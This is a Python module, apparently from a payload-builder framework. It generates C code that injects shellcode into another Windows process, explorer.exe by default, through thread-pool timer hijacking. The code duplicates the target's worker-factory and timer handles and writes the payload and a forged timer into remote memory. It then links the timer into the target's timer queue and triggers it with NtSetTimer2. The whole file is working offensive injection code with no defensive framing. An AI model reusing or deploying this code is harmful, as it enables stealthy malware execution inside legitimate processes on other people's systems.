from string import Template
import os
import sys
from pathlib import Path

class tp_timer:
    def __init__(self, arguments):
        self.apicallsList = []
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'explorer.exe'
        if 'target' in arguments:
            self.target = arguments['target']

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <tlhelp32.h>",
                '#include "poolinject.h"',
                '#include "tpstructs.h"']

    def compilerOptions(self) -> list[str]:
        return [f'-I{Path(sys.modules['__main__'].__file__).resolve().parent}/c/includes/']
    
    def codeblocks(self) -> str:
        return """
#define WIN32_FUNC( x )     __typeof__( x ) * x

typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
    HANDLE                   ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID                    ProcessInformation,
    ULONG                    ProcessInformationLength,
    PULONG                   ReturnLength
);

typedef NTSTATUS (NTAPI *pfnNtQueryObject)(
    HANDLE                   Handle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID                    ObjectInformation,
    ULONG                    ObjectInformationLength,
    PULONG                   ReturnLength
);

typedef NTSTATUS (NTAPI *pfnNtSetTimer2)(
    HANDLE TimerHandle,
    PLARGE_INTEGER DueTime,
    PLARGE_INTEGER Period,        // _In_opt_
    PVOID Parameters              // _In_ PT2_SET_PARAMETERS
);

typedef NTSTATUS (NTAPI *pfnNtQueryInformationWorkerFactory)(
    HANDLE WorkerFactoryHandle,
    int WorkerFactoryInformationClass, // _In_ WORKERFACTORYINFOCLASS
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength,
    PULONG ReturnLength           // _Out_opt_
);

HANDLE GetHandle( DWORD PID, LPWSTR HandleName, SIZE_T Access )
{
    HANDLE hProcess         = NULL;
    NTSTATUS Status         = { 0 };
    DWORD szInformation     = 0;
    HANDLE hDupObject       = NULL;

    PPUBLIC_OBJECT_TYPE_INFORMATION      ObjectInformation = NULL;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION ProcessHandleInfo = NULL;

    pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryInformationProcess" );
    pfnNtQueryObject NtQueryObject             = (pfnNtQueryObject)GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryObject" );

    // Principle of least privilege... for our handles.
    //printf( "%S\\n", HandleName );
    if ( !wcscmp( HandleName, L"Process" ) ) 
        hProcess = OpenProcess( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, PID );
    else
        hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, PID );

    if ( hProcess == INVALID_HANDLE_VALUE || !hProcess ) {
        printf( "OpenProcess error: 0x%llx\\n", GetLastError() );
        return NULL;
    }
    
    if ( hProcess && !wcscmp( HandleName, L"Process" ) )
        return hProcess;

    do {
        ProcessHandleInfo = realloc( ProcessHandleInfo, szInformation );
        Status = NtQueryInformationProcess( hProcess, ProcessHandleInformation, ProcessHandleInfo, szInformation, &szInformation );
        if ( Status && Status != STATUS_INFO_LENGTH_MISMATCH ) {
            printf( "Error querying target process's handle table: 0x%llx\\n", Status );
        }
    } while ( Status == STATUS_INFO_LENGTH_MISMATCH );

    for ( DWORD i = 0; i < ProcessHandleInfo->NumberOfHandles; i++ ) {
        
        Status = DuplicateHandle( hProcess, ProcessHandleInfo->Handles[i].HandleValue, (HANDLE)-1, &hDupObject, Access, 0, 0 );

        if ( !Status )
            continue;

        szInformation = 0;

        do {
            ObjectInformation = realloc( ObjectInformation, szInformation );
            Status = NtQueryObject( hDupObject, ObjectTypeInformation, ObjectInformation, szInformation, &szInformation );
        } while ( Status == STATUS_INFO_LENGTH_MISMATCH );

        if ( !wcscmp( ObjectInformation->TypeName.Buffer, HandleName ) ) {
            CloseHandle( hProcess );
            return hDupObject;
        }

        CloseHandle( hDupObject );

    }
    if ( hProcess && hProcess != (HANDLE)-1 )
        CloseHandle( hProcess );
    if ( hDupObject )
        CloseHandle( hDupObject );
    return NULL;
    
}

"""

    def apicalls(self) -> list[str]:
        return self.apicallsList

    def template(self) -> str:
        return Template("""

    DWORD PID = 0;

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
            
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!Process32First(hProcSnap, &pe32)) {{
            CloseHandle(hProcSnap);
            return 0;
    }}
            
    while (Process32Next(hProcSnap, &pe32)) {{
        if (lstrcmpiA("$target", pe32.szExeFile) == 0) {{
                PID = pe32.th32ProcessID;
                break;
        }}
    }}
            
    CloseHandle(hProcSnap);


    {transformers}
    
    HANDLE hProcess = NULL;
    HANDLE hFactory = NULL;
    HANDLE hTimerQ  = NULL;

    BOOL        Status      = 0;
    PVOID       BaseAddress = NULL;
    SIZE_T      RegionSize  = 0;
    DWORD       OldProtect  = 0;

    WORKER_FACTORY_BASIC_INFORMATION FactoryInfo  = {{ 0 }};
    PFULL_TP_TIMER                   TpTimer      = NULL;
    PFULL_TP_TIMER                   TimerAddress = NULL;
    PVOID                            StartLink    = NULL;
    PVOID                            EndLink      = NULL;
    DWORD                            SzTimer      = sizeof( FULL_TP_TIMER );
    LARGE_INTEGER                    li           = {{ 0 }};
    T2_SET_PARAMETERS                TimerParams  = {{ 0 }};

    pfnNtSetTimer2 NtSetTimer2 = (pfnNtSetTimer2)GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtSetTimer2" );
    pfnNtQueryInformationWorkerFactory NtQueryInformationWorkerFactory = (pfnNtQueryInformationWorkerFactory)GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtQueryInformationWorkerFactory" );

    // Get Handles
    hProcess    = GetHandle( PID, L"Process", PROCESS_ALL_ACCESS );
    hFactory    = GetHandle( PID, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS );
    hTimerQ     = GetHandle( PID, L"IRTimer", TIMER_ALL_ACCESS );

    // Allocate space for the payload
    RegionSize = {shellcodeSize};
    BaseAddress = VirtualAllocEx( hProcess, NULL, {shellcodeSize}, MEM_COMMIT, PAGE_READWRITE );
    printf( "Allocated 0x%llx bytes to: 0x%llx\\n", {shellcodeSize}, BaseAddress );

    // Write the payload
    Status     = WriteProcessMemory( hProcess, BaseAddress, shellcode, {shellcodeSize}, NULL );
    printf( "Wrote payload in successfully!\\n" );

    // Get WorkerFactoryBasicInformation so we can obtain the StartParameter
    Status     = NtQueryInformationWorkerFactory( hFactory, WorkerFactoryBasicInformation, &FactoryInfo, sizeof(FactoryInfo), NULL );
    printf( "Queried Worker Factory information successfully!\\n" );

    // Make payload executable
    Status      = VirtualProtectEx( hProcess, BaseAddress, RegionSize, PAGE_EXECUTE_READ, &OldProtect );

    // Create a timer in our local process
    TpTimer     = (PFULL_TP_TIMER)CreateThreadpoolTimer( BaseAddress, NULL, NULL );

    // Allocate space for the timer
    RegionSize     = SzTimer;
    TimerAddress   = VirtualAllocEx( hProcess, TimerAddress, RegionSize, MEM_COMMIT, PAGE_READWRITE );
    printf( "Allocated 0x%llx bytes to: 0x%llx\\n", RegionSize, TimerAddress );

    // Rebase the pointers of the timer to be based on the remote allocation we made
    TpTimer->Work.CleanupGroupMember.Pool    = FactoryInfo.StartParameter; // Remote process's pool
    TpTimer->DueTime                         =  -10000000;
    TpTimer->WindowStartLinks.Key            =  -10000000;
    TpTimer->WindowEndLinks.Key              =  -10000000;
    TpTimer->WindowStartLinks.Children.Flink = &TimerAddress->WindowStartLinks.Children;
    TpTimer->WindowStartLinks.Children.Blink = &TimerAddress->WindowStartLinks.Children;
    TpTimer->WindowEndLinks.Children.Flink   = &TimerAddress->WindowEndLinks.Children;
    TpTimer->WindowEndLinks.Children.Blink   = &TimerAddress->WindowEndLinks.Children;

    StartLink  = &TimerAddress->WindowStartLinks;
    EndLink    = &TimerAddress->WindowEndLinks;

    // Write the timer in
    Status     = WriteProcessMemory( hProcess, TimerAddress, TpTimer, SzTimer, NULL );
    if ( !Status ) {{
        printf( "Error writing timer to target process: 0x%llx\\n", GetLastError() );
    }}
    printf( "Wrote timer in successfully!\\n" );

    // Insert our timer's start and end links into the remote process's timer queue
    Status     = WriteProcessMemory( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, &StartLink, sizeof( PVOID ), NULL );
    if ( !Status ) {{
        printf( "Error overwriting WindowStart.Root in target process: 0x%llx\\n", GetLastError() );
    }}

    // Insert our timer's start and end links into the remote process's timer queue
    Status     = WriteProcessMemory( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, &EndLink, sizeof( PVOID ), NULL );
    if ( !Status ) {{
        printf( "Error overwriting WindowEnd.Root in target process: 0x%llx\\n", GetLastError() );
    }}

    li.QuadPart = -10000000;

    // Signal the remote process's timer queue to execute our payload
    Status      = NtSetTimer2( hTimerQ, &li, NULL, &TimerParams );
    if ( Status ) {{
        printf( "Error signalling timer in target process: 0x%llx\\n", Status );
    }}
    printf( "Payload executed\\n" );

    if ( hFactory ) {{
        CloseHandle( hFactory );
    }}
    if ( hTimerQ ) {{
        CloseHandle( hTimerQ );
    }}
    if ( hProcess ) {{
        CloseHandle( hProcess );
    }}
""").substitute(target=self.target)